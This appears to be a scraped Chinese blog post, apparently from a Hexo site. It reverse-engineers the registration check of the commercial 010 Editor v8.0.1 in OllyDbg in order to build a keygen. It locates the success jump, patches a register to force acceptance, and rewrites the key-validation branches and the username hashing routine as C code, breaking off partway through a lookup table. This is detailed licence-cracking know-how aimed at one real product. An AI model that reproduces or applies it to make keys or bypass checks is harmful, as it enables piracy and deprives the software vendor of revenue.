4B 90第一个API调用:GetModuleHandlAAPI调用IAT时，采用模式是FF25 2.区段名称 区段分类较细 3.链接器版本 5.0 Delphi程序特征1.OEP特征 5个CALL,第一个CALL内有API调用GetModulehandleA 2.区段名称 3. 链接器版本 2.25 VS程序 以链接器版本为例，分析VC程序 VC6.0 版本 VC6.0 6.0 VC2003 7.0/7.1 VC2005 8.0 VS2008 9.0 VS2010 10.0 VS2012 11.0 VS2013 12.0 VS2015 14.0 VS2017 14.0 VC6.0/易语言OEP 申请局部空间是:sub esp,0x58第一个API调用是GetVersion","categories":[],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://yoursite.com/tags/逆向/"}]},{"title":"010 Editor v8.0.1_x32分析以及注册机制作","slug":"010 Editor分析","date":"2018-06-25T01:09:57.000Z","updated":"2018-07-03T12:37:16.846Z","comments":true,"path":"2018/06/25/010 Editor分析/","link":"","permalink":"http://yoursite.com/2018/06/25/010 Editor分析/","excerpt":"","text":"环境以及工具 Window7_x32 010 Editor v8.0.1_x32 OD VS2017 第一步 找到判断注册结果的关键跳转和关键函数 使用OD打开010editor，进入到注册界面，先尝试输入随意的ID和Key，获取弹出的提示信息字符串 尝试在OD中搜索如下字符 “Invalid name or password.”，搜索结果如下 发现存在大量提示信息，我们在其中找到注册成功的提示信息，（上图红框：感谢购买010editor），双击查看反汇编窗口，见下图。 往上查看判断注册成功的关键跳转 我们发现地址为00DD5926处跳转JNZ 010Edito.00DD5A58应该为关键跳转，下方可以找到输出字符串”Password accepted. This ….”， 而其跳转地址处汇编代码为输出”Password accepted….” （010editor使用QT界面库编写 ，我们可以猜测出push字符串随后的函数应为输出字符串） 回到关键跳转00DD5926处，判断密码为正确的条件为EDI = 0xDB，而EDI的值是EAX给的，而EAX为函数010Edito.00409C9B的返回值，这个函数可能为验证Key的关键函数，而我们动态调试发现有跳转直接跳转到cmp edi,0xdb。 同样为函数010Edito.00409C9B，现在可以认为这是关键函数，此时EDI的值为0x177，为了验证此跳转为关键跳转，我们把EDI的值修改为0xDB。 之后F9运行 验证成功！接下来我们进入函数分析。 第二步 分析关键函数1(返回DB为注册成功) 函数010Edito.00409C9B，参数情况为： arg1 = 0x9 ； arg2 = 0x4389； 从下往上看，找到需要的0xDB，而跳转条件是eax = 0x2D， 为函数010Edito.0040A826的返回值。 ###第三步 分析关键函数2(返回2D为注册成功) 进入函数，该函数作用为将key取出，放在在局部变量数组中，数组起始地址为ebx-24 1234567891011&gt; key[0 ] = [ebx-24]=0x12&gt; key[1 ] = [ebx-23]=0x34&gt; key[2 ] = [ebx-22]=0x56&gt; key[3 ] = [ebx-21]=0x78&gt; key[4 ] = [ebx-20]=0x90&gt; key[5 ] = [ebx-1F]=0x12&gt; key[6 ] = [ebx-1E]=0x34&gt; key[7 ] = [ebx-1D]=0x56&gt; key[8 ] = [ebx-1C]=0x78&gt; key[9 ] = [ebx-1B]=0x90&gt; 密钥数组对应如上，该处汇编代码如下，当KEY[3] == 0x9C时 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&gt; 013BDC5D . 8A5D DF MOV BL,BYTE PTR SS:[EBP-0x21] ; key[3]&gt; 013BDC60 . 8A7D E1 MOV BH,BYTE PTR SS:[EBP-0x1F] ; key[5]&gt; 013BDC63 . 80FB 9C CMP BL,0x9C ; 是否等于0x9c&gt; 013BDC66 . 75 70 JNZ SHORT 010Edito.013BDCD8 ; 跳转到是否等于FC&gt; 013BDC68 . 8A45 DC MOV AL,BYTE PTR SS:[EBP-0x24] ; key[0]&gt; 013BDC6B . 3245 E2 XOR AL,BYTE PTR SS:[EBP-0x1E] ; key[0]^key[6]&gt; 013BDC6E . 8845 E8 MOV BYTE PTR SS:[EBP-0x18],AL ;&gt; 013BDC71 . 8A45 DD MOV AL,BYTE PTR SS:[EBP-0x23] ; key[1]&gt; 013BDC74 . 3245 E3 XOR AL,BYTE PTR SS:[EBP-0x1D] ; key[1]^key[7]&gt; 013BDC77 . FF75 E8 PUSH DWORD PTR SS:[EBP-0x18]&gt; 013BDC7A . 0FB6C8 MOVZX ECX,AL&gt; 013BDC7D . B8 00010000 MOV EAX,0x100&gt; 013BDC82 . 66:0FAFC8 IMUL CX,AX ; (key[1]^key[7])*0x100&gt; 013BDC86 . 8A45 DE MOV AL,BYTE PTR SS:[EBP-0x22] ; key[2]&gt; 013BDC89 . 32C7 XOR AL,BH ; key[2]^key[5]&gt; 013BDC8B . 0FB6C0 MOVZX EAX,AL&gt; 013BDC8E . 66:03C8 ADD CX,AX &gt; ;cx = (key[1]^key[7])*0x100 + key[2]^key[5]&gt; 013BDC91 . 0FB7F1 MOVZX ESI,CX&gt; 013BDC94 . E8 AB9904FF CALL 010Edito.00407644 &gt; 013BD0B0 /&gt; \\55 PUSH EBP&gt; 013BD0B1 |. 8BEC MOV EBP,ESP&gt; 013BD0B3 |. 8B45 08 MOV EAX,[ARG.1] &gt; ; eax = key[0]^key[6] &gt; 013BD0B6 |. 34 18 XOR AL,0x18 &gt; ; al = key[0]^key[6]^0x18 &gt; 013BD0B8 |. 04 3D ADD AL,0x3D &gt; ; al = key[0]^key[6]^0x18 + 0x3D&gt; 013BD0BA |. 34 A7 XOR AL,0xA7 &gt; ; al =(key[0]^key[6]^0x18+0x3D)^0xA7&gt; 013BD0BC |. 5D POP EBP &gt; 013BD0BD \\. C3 RETN&gt; &gt; 013BDC99 . 0FB6C0 MOVZX EAX,AL&gt; 013BDC9C . 56 PUSH ESI &gt; ; esi = (key[1]^key[7])*0x100 + key[2]^key[5]&gt; 013BDC9D . 8947 1C MOV DWORD PTR DS:[EDI+0x1C],EAX&gt; 013BDCA0 . E8 23A704FF CALL 010Edito.004083C8&gt; 013BD020 /&gt; \\55 PUSH EBP&gt; 013BD021 |. 8BEC MOV EBP,ESP&gt; 013BD023 |. 8B45 08 MOV EAX,[ARG.1] &gt; ;eax=(key[1]^key[7])*100+key[2]^key[5]&gt; 013BD026 |. B9 0B000000 MOV ECX,0xB &gt; ; ecx = 0xB&gt; 013BD02B |. 35 92780000 XOR EAX,0x7892 &gt; ;eax=((key[1]^key[7])*0x100+key[2]^key[5])^0x7892&gt; 013BD030 |. 05 304D0000 ADD EAX,0x4D30&gt; ;eax=((key[1]^key[7])*0x100+key[2]^key[5])^0x7892 + 0x4D30&gt; 013BD035 |. 35 21340000 XOR EAX,0x3421&gt; ;eax=(((key[1]^key[7])*0x100+key[2]^key[5])^0x7892 + 0x4D30)^0x3421&gt; 013BD03A |. 0FB7C0 MOVZX EAX,AX&gt; 013BD03D |. 99 CDQ&gt; 013BD03E |. F7F9 IDIV ECX &gt; ;eax=(((key[1]^key[7])*0x100+key[2]^key[5])^0x7892 + 0x4D30)^0x3421/0xB&gt; 013BD040 |. 85D2 TEST EDX,EDX ;eax/ecx的余数是否为0&gt; 013BD042 |. 74 02 JE SHORT 010Edito.013BD046 ;如果余数不为0,清零eax&gt; 013BD044 |. 33C0 XOR EAX,EAX&gt; 013BD046 |&gt; 5D POP EBP &gt; 013BD047 \\. C3 RETN&gt; &gt; 013BDCA5 . 8B4F 1C MOV ECX,DWORD PTR DS:[EDI+0x1C]&gt; ; ecx = (key[0]^key[6]^0x18+0x3D)^0xA7&gt; 013BDCA8 . 83C4 08 ADD ESP,0x8 &gt; 013BDCAB . 0FB7C0 MOVZX EAX,AX&gt; ;eax=(((key[1]^key[7])*100+key[2]^key[5])^0x7892 + 0x4D30)^0x3421&gt; 013BDCAE . 8947 20 MOV DWORD PTR DS:[EDI+0x20],EAX&gt; ;[EDI+0x20] =(((key[1]^key[7])*100+key[2]^key[5])^0x7892 + 0x4D30)^0x3421/0xB&gt; 013BDCB1 . 85C9 TEST ECX,ECX &gt; 013BDCB3 . 0F84 BC010000 JE 010Edito.013BDE75 ;ecx = 0 则eax=E7返回，验证失败&gt; 013BDCB9 . 85C0 TEST EAX,EAX&gt; 013BDCBB . 0F84 B4010000 JE 010Edito.013BDE75 ;eax = 0 则eax=E7返回，验证失败&gt; 013BDCC1 . 3D E8030000 CMP EAX,0x3E8&gt; 013BDCC6 . 0F87 A9010000 JA 010Edito.013BDE75 ;eax &gt; 0x3E8 则eax=E7返回，验证失败&gt; 013BDCCC . 83F9 02 CMP ECX,0x2 ;ecx小于等于1时，借位cf=1,否则cf=0&gt; 013BDCCF . 1BF6 SBB ESI,ESI ; esi=esi-esi-CF=-cf&gt; 013BDCD1 . 23F1 AND ESI,ECX ;esi = esi &amp; ecx &gt; 013BDCD3 . E9 B3000000 JMP 010Edito.013BDD8B ;0xAC分支也跳转到这里013BDD8B&gt; 当KEY[3] == 0x9C时，等换成C为 123456789101112131415161718192021222324252627282930&gt; case 0x9C:&gt; &#123;&gt; [EDI+0x1C] = (key[0]^key[6]^0x18+0x3D)^0xA7; //最后一步验证用到&gt; [EDI+0x20] =(((key[1]^key[7])*0x100+key[2]^key[5])^0x7892 + 0x4D30)^0x3421;&gt; eax=(((key[1]^key[7])*0x100+key[2]^key[5])^0x7892 + 0x4D30)^0x3421;&gt; ecx = (key[0]^key[6]^0x18+0x3D)^0xA7;&gt; cf = 0;&gt; if(eax % 0xB != 0)&gt; &#123;&gt; eax = 0;&gt; &#125; &gt; if(ecx == 0 || eax == 0 || eax &gt; 0x3E8)&gt; &#123;&gt; //验证失败&gt; return;&gt; &#125;&gt; else &gt; &#123;&gt; &gt; eax=(((key[1]^key[7])*0x100+key[2]^key[5])^0x7892 + 0x4D30)^0x3421/0xB;&gt; [EDI+0x20] = eax;&gt; if(ecx &lt;= 1)&gt; &#123;&gt; cf = 1;&gt; &#125;&gt; esi = (0 - cf) &amp; ecx; //cf=0 则 esi=0;&gt; &#125;&gt; break;&gt; &#125;&gt; 当KEY[3] == 0xFC时，所有跳转最终都不返回我们需要的0x2D ，跳过。 当KEY[3] == 0xAC时 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&gt; 013BDCFC &gt; \\80FB AC CMP BL,0xAC&gt; 013BDCFF . 0F85 70010000 JNZ 010Edito.013BDE75&gt; 013BDD05 . 8A45 DD MOV AL,BYTE PTR SS:[EBP-0x23] ; al = key[1]&gt; 013BDD08 . 3245 E3 XOR AL,BYTE PTR SS:[EBP-0x1D] ; al = key[1]^key[7]&gt; 013BDD0B . 0FB6C8 MOVZX ECX,AL ; ecx = key[1]^key[7]&gt; 013BDD0E . B8 00010000 MOV EAX,0x100&gt; 013BDD13 . 66:0FAFC8 IMUL CX,AX ; cx = (key[1]^key[7]) * 0x100&gt; 013BDD17 . 8A45 DE MOV AL,BYTE PTR SS:[EBP-0x22] ; al = key[2]&gt; 013BDD1A . 32C7 XOR AL,BH ; al = key[2]^key[5]&gt; 013BDD1C . C747 1C 02000&gt;MOV DWORD PTR DS:[EDI+0x1C],0x2 ;[edi+0x1C] = 0x2&gt; 013BDD23 . 0FB6C0 MOVZX EAX,AL ; eax = key[2]^key[5]&gt; 013BDD26 . 66:03C8 ADD CX,AX ; cx = (key[1]^key[7]) * 0x100 + key[2]^key[5]&gt; 013BDD29 . 0FB7C1 MOVZX EAX,CX ; eax = (key[1]^key[7]) * 0x100 + key[2]^key[5]&gt; 013BDD2C . 50 PUSH EAX&gt; 013BDD2D . E8 96A604FF CALL 010Edito.004083C8&gt; 013BD020 /&gt; \\55 PUSH EBP&gt; 013BD021 |. 8BEC MOV EBP,ESP&gt; 013BD023 |. 8B45 08 MOV EAX,[ARG.1] &gt; 013BD026 |. B9 0B000000 MOV ECX,0xB&gt; 013BD02B |. 35 92780000 XOR EAX,0x7892 ; eax = ((key[1]^key[7]) * 0x100 + key[2]^key[5])^0x7892&gt; 013BD030 |. 05 304D0000 ADD EAX,0x4D30 ; eax = ((key[1]^key[7]) * 0x100 + key[2]^key[5])^0x7892 + 0x4D30&gt; 013BD035 |. 35 21340000 XOR EAX,0x3421 ; eax = (((key[1]^key[7]) * 0x100 + key[2]^key[5])^0x7892 + 0x4D30)^0x3421&gt; 013BD03A |. 0FB7C0 MOVZX EAX,AX&gt; 013BD03D |. 99 CDQ&gt; 013BD03E |. F7F9 IDIV ECX ; eax = ((((key[1]^key[7]) * 0x100 + key[2]^key[5])^0x7892 + 0x4D30)^0x3421)/0xB&gt; 013BD040 |. 85D2 TEST EDX,EDX ; 余数edx != 0 则，eax=0&gt; 013BD042 |. 74 02 JE SHORT 010Edito.013BD046&gt; 013BD044 |. 33C0 XOR EAX,EAX&gt; 013BD046 |&gt; 5D POP EBP &gt; 013BD047 \\. C3 RETN&gt; &gt; 013BDD32 . 0FB7C0 MOVZX EAX,AX&gt; 013BDD35 . 83C4 04 ADD ESP,0x4&gt; 013BDD38 . 8947 20 MOV DWORD PTR DS:[EDI+0x20],EAX&gt; 013BDD3B . 85C0 TEST EAX,EAX ; 检测上面的函数返回结果eax是否为0&gt; 013BDD3D . 0F84 32010000 JE 010Edito.013BDE75;eax=0跳转到返回0xE7，验证失败&gt; 013BDD43 . 3D E8030000 CMP EAX,0x3E8&gt; 013BDD48 . 0F87 27010000 JA 010Edito.013BDE75;eax大于0x3E8跳转到返回0xE7，验证失败&gt; 013BDD4E . 0FB655 E5 MOVZX EDX,BYTE PTR SS:[EBP-0x1B] ; edx = key[9]&gt; 013BDD52 . 0FB64D E0 MOVZX ECX,BYTE PTR SS:[EBP-0x20] ; ecx = key[4]&gt; 013BDD56 . 0FB6C7 MOVZX EAX,BH ; eax = key[5]&gt; 013BDD59 . 33D0 XOR EDX,EAX ; edx = key[9]^key[5]&gt; 013BDD5B . 0FB645 E4 MOVZX EAX,BYTE PTR SS:[EBP-0x1C] ; eax = key[8] &gt; 013BDD5F . 33C8 XOR ECX,EAX ; ecx = key[4]^key[8]&gt; 013BDD61 . C1E2 08 SHL EDX,0x8&gt; 013BDD64 . 0FB645 E2 MOVZX EAX,BYTE PTR SS:[EBP-0x1E] ; eax = key[6]&gt; 013BDD68 . 03D1 ADD EDX,ECX ; edx = ((key[9]^key[5])&lt;&lt;8) + key[4]^key[8]&gt; 013BDD6A . 0FB64D DC MOVZX ECX,BYTE PTR SS:[EBP-0x24] ; ecx = key[0]&gt; 013BDD6E . C1E2 08 SHL EDX,0x8 ; edx = (((key[9]^key[5]) &lt;&lt; 8) + key[4]^key[8]) &lt;&lt; 8&gt; 013BDD71 . 33C8 XOR ECX,EAX ; ecx = key[0]^key[6]&gt; 013BDD73 . 03D1 ADD EDX,ECX ; edx = ((((key[9]^key[5]) &lt;&lt; 8) + key[4]^key[8]) &lt;&lt; 8) + key[0]^key[6]&gt; 013BDD75 . 68 278C5B00 PUSH 010Edito.005B8C27 ; CCCCCCCC&gt; 013BDD7A . 52 PUSH EDX&gt; 013BDD7B . E8 0BCA04FF CALL 010Edito.0040A78B&gt; 013BCF90 /&gt; \\55 PUSH EBP&gt; 013BCF91 |. 8BEC MOV EBP,ESP&gt; 013BCF93 |. 8B4D 08 MOV ECX,[ARG.1] ; ecx = ((((key[9]^key[5]) &lt;&lt; 8) + key[4]^key[8]) &lt;&lt; 8) + key[0]^key[6]&gt; 013BCF96 |. B8 F1F0F0F0 MOV EAX,0xF0F0F0F1&gt; 013BCF9B |. 334D 0C XOR ECX,[ARG.2] ; ecx = (((((key[9]^key[5]) &lt;&lt; 8) + key[4]^key[8]) &lt;&lt; 8) + key[0]^key[6]) ^ 0x005B8C27 &gt; 013BCF9E |. 81F1 78C02200 XOR ECX,0x22C078 ; ecx = ((((((key[9]^key[5]) &lt;&lt; 8) + key[4]^key[8]) &lt;&lt; 8) + key[0]^key[6]) ^ 0x005B8C27) ^ 0x22C078&gt; 013BCFA4 |. 81E9 75C10200 SUB ECX,0x2C175 ; ecx = ((((((key[9]^key[5]) &lt;&lt; 8) + key[4]^key[8]) &lt;&lt; 8) + key[0]^key[6]) ^ 0x005B8C27) ^ 0x22C078 - 0x2C175&gt; 013BCFAA |. 81F1 6731E5FF XOR ECX,0xFFE53167 ; ecx = (((((((key[9]^key[5]) &lt;&lt; 8) + key[4]^key[8]) &lt;&lt; 8) + key[0]^key[6]) ^ 0x005B8C27) ^ 0x22C078 - 0x2C175) ^ 0xFFE53167&gt; 013BCFB0 |. 81E1 FFFFFF00 AND ECX,0xFFFFFF ; ecx = ((((((((key[9]^key[5]) &lt;&lt; 8) + key[4]^key[8]) &lt;&lt; 8) + key[0]^key[6]) ^ 0x005B8C27) ^ 0x22C078 - 0x2C175) ^ 0xFFE53167) &amp; 0xFFFFFF&gt; 013BCFB6 |. F7E1 MUL ECX ; eax = 0xF0F0F0F1 * ecx 结果高32位放在edx。 低32位放在eax&gt; 013BCFB8 |. C1EA 04 SHR EDX,0x4&gt; 013BCFBB |. 8BC2 MOV EAX,EDX&gt; 013BCFBD |. C1E0 04 SHL EAX,0x4&gt; 013BCFC0 |. 03C2 ADD EAX,EDX&gt; 013BCFC2 |. 2BC8 SUB ECX,EAX ;结果为0 则 zf=1&gt; 013BCFC4 |. B8 00000000 MOV EAX,0x0&gt; 013BCFC9 |. 0F44C2 CMOVE EAX,EDX ;当zf = 1时移动 &gt; 013BCFCC |. 5D POP EBP &gt; 013BCFCD \\. C3 RETN&gt; &gt; &gt; 013BDD80 . 83C4 08 ADD ESP,0x8&gt; 013BDD83 . 8945 F0 MOV DWORD PTR SS:[EBP-0x10],EAX&gt; 013BDD86 . 8947 34 MOV DWORD PTR DS:[EDI+0x34],EAX&gt; 013BDD89 . 8BF0 MOV ESI,EAX&gt; 013BDD8B &gt; \\8D45 EC LEA EAX,DWORD PTR SS:[EBP-0x14];0x9C分支也跳转到这里&gt; 转换成C代码 123456789101112131415161718192021222324252627&gt; case 0xAC:&gt; &#123;&gt; eax = ((((key[1]^key[7]) * 0x100 + key[2]^key[5])^0x7892 + 0x4D30)^0x3421);&gt; ecx = ((((((((key[9]^key[5]) &lt;&lt; 8) + key[4]^key[8]) &lt;&lt; 8) + key[0]^key[6]) ^ 0x005B8C27) ^ 0x22C078 - 0x2C175) ^ 0xFFE53167) &amp; 0xFFFFFF;&gt; if(eax % 0xB != 0)&gt; &#123;&gt; eax = 0;&gt; return ; //跳转返回0x7E分支，验证失败&gt; &#125;&gt; eax = ((((key[1]^key[7]) * 0x100 + key[2]^key[5])^0x7892 + 0x4D30)^0x3421)/0xB;&gt; eax = 0xF0F0F0F1 * ecx; // 结果高32位放在edx。 低32位放在eax&gt; edx = edx &gt;&gt; 4;&gt; eax = edx;&gt; eax = eax &lt;&lt; 4;&gt; eax = eax + edx;&gt; ecx = ecx - eax;&gt; eax = 0;&gt; if（ecx==0）&gt; &#123;&gt; eax = edx; &gt; &#125; &gt; [ebp-0x10] = eax; //最后一步验证用到&gt; [edi+0x34] = eax;&gt; esi = eax;&gt; break;&gt; &#125;&gt; 分支0x9C、0xAC都将运行到此处 12345&gt;013BDD8B &gt; \\8D45 EC LEA EAX,DWORD PTR SS:[EBP-0x14]&gt;013BDD8E . 50 PUSH EAX&gt;013BDD8F . 8D4F 04 LEA ECX,DWORD PTR DS:[EDI+0x4]&gt;013BDD92 . FF15 782BE702 CALL DWORD PTR DS:[&lt;&amp;Qt5Core.?toUtf8@QString@@QBE?AVQByteArr&gt;; Qt5Core.?toUtf8@QString@@QBE?AVQByteArray@@XZ&gt; 不知道这段是干嘛，我们继续单步，到如上图所示，函数[&lt;&amp;Qt5Core.?data@QByteArray@@QAE&gt;] 返回了用户名字符串，然后传入函数010Edito.00402E50，其再返回 一串类似哈希值的值，那么这个函数的作用应该为处理函数名称，进入分析。 第四步 分析用户名处理函数 根据mov esp, 0x10可知，用户名处理函数共有四个参数 参数1：用户名 参数2：当BL=0XFC时为1，否则为0，根据前面的分析可知，BL为Key[3] 参数3：esi，经上一个函数处理得到 参数4：[edi+0x20]，经上一个函数处理得到 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146&gt; 013BD120 /&gt; \\55 PUSH EBP&gt; 013BD121 |. 8BEC MOV EBP,ESP&gt; 013BD123 |. 83EC 10 SUB ESP,0x10&gt; 013BD126 |. 8B55 08 MOV EDX,[ARG.1]&gt; ;edx = 用户名pName&gt; 013BD129 |. 33C9 XOR ECX,ECX&gt; ;ecx = 0&gt; 013BD12B |. 56 PUSH ESI&gt; ;备份esi&gt; 013BD12C |. 8BF2 MOV ESI,EDX&gt; ;esi = 用户名pName&gt; 013BD12E |. 894D FC MOV [LOCAL.1],ECX&gt; ;[LOCAL.1] = 0&gt; 013BD131 |. 57 PUSH EDI&gt; ;备份EDI&gt; 013BD132 |. 8D7E 01 LEA EDI,DWORD PTR DS:[ESI+0x1]&gt; ;edi = 用户名地址 + 1，后面被esi减去求得长度&gt; 013BD135 |&gt; 8A06 /MOV AL,BYTE PTR DS:[ESI]&gt; ;al = pName[0]&gt; 013BD137 |. 46 |INC ESI&gt; ;pName++&gt; 013BD138 |. 84C0 |TEST AL,AL&gt; 013BD13A |.^ 75 F9 \\JNZ SHORT 010Edito.013BD135&gt; ;判断是否到达字符串结尾&gt; 013BD13C |. 2BF7 SUB ESI,EDI&gt; ;求得长度，ESI指向为用户名字符串结尾的&apos;\\0&apos;&gt; 013BD13E |. 33FF XOR EDI,EDI&gt; 013BD140 |. 85F6 TEST ESI,ESI&gt; 013BD142 |. 0F8E F0000000 JLE 010Edito.013BD238&gt; ;检查长度是否不为0&gt; 013BD148 |. 53 PUSH EBX&gt; 013BD149 |. 8B5D 14 MOV EBX,[ARG.4]&gt; ;ebx = [ARG.4] = 传入的[edi+0x20]&gt; 013BD14C |. 894D F0 MOV [LOCAL.4],ECX ;置零&gt; 013BD14F |. 894D F4 MOV [LOCAL.3],ECX ;置零&gt; 013BD152 |. 8B4D 10 MOV ECX,[ARG.3]&gt; ;ecx = [ARG.3] = 传入的esi&gt; 013BD155 |. C1E3 04 SHL EBX,0x4&gt; 013BD158 |. 2B5D 14 SUB EBX,[ARG.4]&gt; ;ebx = ([ARG.4] *16) - [ARG.4]&gt; 013BD15B |. C1E1 04 SHL ECX,0x4&gt; 013BD15E |. 034D 10 ADD ECX,[ARG.3]&gt; ;ecx = ([ARG.3] *16) + [ARG.3]&gt; 013BD161 |. 894D F8 MOV [LOCAL.2],ECX&gt; ;[LOCAL.2] = ([ARG.3] &lt;&lt; 4) + [ARG.3]&gt; 013BD164 |&gt; 0FB60417 /MOVZX EAX,BYTE PTR DS:[EDI+EDX]&gt; 013BD168 |. 50 |PUSH EAX ; /c = B6&gt; 013BD169 |. FF15 9422E702 |CALL DWORD PTR DS:[&lt;&amp;MSVCR120.toupper&gt;] ; \\toupper 小写字母转换为大写字母&gt; 013BD16F |. 8BD0 |MOV EDX,EAX&gt; ;返回值复制给edx，大写字符&gt; 013BD171 |. 83C4 04 |ADD ESP,0x4&gt; 013BD174 |. 8B0C95 4841E6&gt;|MOV ECX,DWORD PTR DS:[EDX*4+0x2E64148]&gt; ;将大写字母作为索引从数组0x2E64148中取内容&gt; ;为了方便，把数组0x2E64148称为nArray，故这里ecx = nArray[edx]&gt; 013BD17B |. 034D FC |ADD ECX,[LOCAL.1]&gt; ;ecx =nArray[大写字符] + [LOCAL.1] ,[LOCAL.1]最初为0&gt; 013BD17E |. 837D 0C 00 |CMP [ARG.2],0x0&gt; ;判断是哪种类型的注册&gt; 013BD182 |. 74 4A |JE SHORT 010Edito.013BD1CE&gt; &gt; &gt; ;注册类型1---------------------------------------------------------&gt; 013BD184 |. 8D42 0D |LEA EAX,DWORD PTR DS:[EDX+0xD] &gt; 013BD187 |. 25 FF000000 |AND EAX,0xFF&gt; ;eax = [大写字符+0xD] &amp; 0xFF，这个值为数组下标，与0xFF可能说明数组最大个数为0xFF,即256个&gt; 013BD18C |. 330C85 4841E6&gt;|XOR ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; ;ecx = (nArray[大写字符] + [LOCAL.1]) ^ nArray[eax]&gt; 013BD193 |. 8D42 2F |LEA EAX,DWORD PTR DS:[EDX+0x2F]&gt; ;eax = [大写字符+0x2F]&gt; 013BD196 |. 25 FF000000 |AND EAX,0xFF&gt; ;eax = eax &amp; 0xFF&gt; 013BD19B |. 0FAF0C85 4841&gt;|IMUL ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; ;ecx = ecx*nArray[eax]&gt; 013BD1A3 |. 8B45 F8 |MOV EAX,[LOCAL.2] ; 010Edito.01885E59&gt; ;eax = [LOCAL.2] = ([ARG.3] &lt;&lt; 4) + [ARG.3]&gt; 013BD1A6 |. 0FB6C0 |MOVZX EAX,AL&gt; ;eax &amp;= 0xFF&gt; 013BD1A9 |. 030C85 4841E6&gt;|ADD ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; ;ecx = ecx + nArray[eax]&gt; 013BD1B0 |. 0FB6C3 |MOVZX EAX,BL&gt; ;eax = ebx = ([ARG.4] &lt;&lt; 4) - [ARG.4]&gt; 013BD1B3 |. 030C85 4841E6&gt;|ADD ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; ;ecx = ecx + nArray[eax]&gt; 013BD1BA |. 8B45 F4 |MOV EAX,[LOCAL.3]&gt; ;eax = [LOCAL.3]&gt; 013BD1BD |. 0FB6C0 |MOVZX EAX,AL&gt; 013BD1C0 |. 030C85 4841E6&gt;|ADD ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; ;ecx = ecx + nArray[eax]&gt; 013BD1C7 |. 8BC1 |MOV EAX,ECX&gt; ;eax = ecx&gt; 013BD1C9 |. 8945 FC |MOV [LOCAL.1],EAX&gt; ;[LOCAL.1] = eax&gt; 013BD1CC |. EB 48 |JMP SHORT 010Edito.013BD216&gt; &gt; &gt; ;注册类型0----------------------------------------------------------&gt; 013BD1CE |&gt; 8D42 3F |LEA EAX,DWORD PTR DS:[EDX+0x3F];这里不同&gt; 013BD1D1 |. 25 FF000000 |AND EAX,0xFF&gt; 013BD1D6 |. 330C85 4841E6&gt;|XOR ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; 013BD1DD |. 8D42 17 |LEA EAX,DWORD PTR DS:[EDX+0x17];这里不同&gt; 013BD1E0 |. 25 FF000000 |AND EAX,0xFF&gt; 013BD1E5 |. 0FAF0C85 4841&gt;|IMUL ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; 013BD1ED |. 8B45 F8 |MOV EAX,[LOCAL.2] ; 010Edito.01885E59&gt; 013BD1F0 |. 0FB6C0 |MOVZX EAX,AL&gt; 013BD1F3 |. 030C85 4841E6&gt;|ADD ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; 013BD1FA |. 0FB6C3 |MOVZX EAX,BL&gt; 013BD1FD |. 030C85 4841E6&gt;|ADD ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; 013BD204 |. 8B45 F0 |MOV EAX,[LOCAL.4]&gt; ;eax = [LOCAL.4], 另一种注册类型这里为 [LOCAL.3]&gt; 013BD207 |. 0FB6C0 |MOVZX EAX,AL&gt; 013BD20A |. 030C85 4841E6&gt;|ADD ECX,DWORD PTR DS:[EAX*4+0x2E64148]&gt; 013BD211 |. 8BC1 |MOV EAX,ECX&gt; 013BD213 |. 894D FC |MOV [LOCAL.1],ECX&gt; &gt; &gt; &gt; ;共通线----------------------------------------------------------------&gt; 013BD216 |&gt; 8345 F4 13 |ADD [LOCAL.3],0x13&gt; ;[LOCAL.3] += 0x13&gt; 013BD21A |. 47 |INC EDI&gt; 013BD21B |. 8345 F8 09 |ADD [LOCAL.2],0x9&gt; ;[LOCAL.2] += 0x9&gt; 013BD21F |. 83C3 0D |ADD EBX,0xD&gt; ;EBX += 0xD&gt; 013BD222 |. 8345 F0 07 |ADD [LOCAL.4],0x7&gt; ;[LOCAL.4] += 0x7&gt; 013BD226 |. 8B55 08 |MOV EDX,[ARG.1]&gt; ; EDX = [ARG.1] = 用户名&gt; 013BD229 |. 3BFE |CMP EDI,ESI&gt; ;ESI指向为用户名字符串结尾的0， 判断EDI是否也到结尾，没有则继续循环计算&gt; 013BD22B |.^ 0F8C 33FFFFFF \\JL 010Edito.013BD164&gt; 013BD231 |. 5B POP EBX ; 05661E08&gt; 013BD232 |. 5F POP EDI ; 05661E08&gt; 013BD233 |. 5E POP ESI ; 05661E08&gt; 013BD234 |. 8BE5 MOV ESP,EBP&gt; 013BD236 |. 5D POP EBP ; 05661E08&gt; 013BD237 |. C3 RETN&gt; &gt; ;用户名长度为0------------------------------------------------------&gt; 013BD238 |&gt; 5F POP EDI ; 05661E08&gt; 013BD239 |. 8BC1 MOV EAX,ECX&gt; 013BD23B |. 5E POP ESI ; 05661E08&gt; 013BD23C |. 8BE5 MOV ESP,EBP&gt; 013BD23E |. 5D POP EBP ; 05661E08&gt; 013BD23F \\. C3 RETN&gt; 转换成C语言 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&gt; arg_1 = pName;&gt; arg_2;&gt; arg_3 = ESI;&gt; arg_4 = [edi+0x20];&gt; &gt; DWORD LOCAL_1 = 0;&gt; DWORD LOCAL_2 = (arg_3 * 16) + arg_3&gt; DWORD LOCAL_3 = 0;&gt; DWORD LOCAL_4 = 0;&gt; &gt; ebx =(arg_4 * 16) - arg_4;&gt; char nArray[256]=&gt; &#123;&gt; 39CB44B8, 23754F67, 5F017211, 3EBB24DA, 351707C6, 63F9774B, 17827288, 0FE74821, 5B5F670F, 48315AE8, 785B7769, 2B7A1547, 38D11292, 42A11B32, 35332244, 77437B60, 1EAB3B10, 53810000, 1D0212AE, 6F0377A8, 43C03092, 2D3C0A8E, 62950CBF, 30F06FFA, 34F710E0, 28F417FB, 350D2F95, 5A361D5A, 15CC060B, 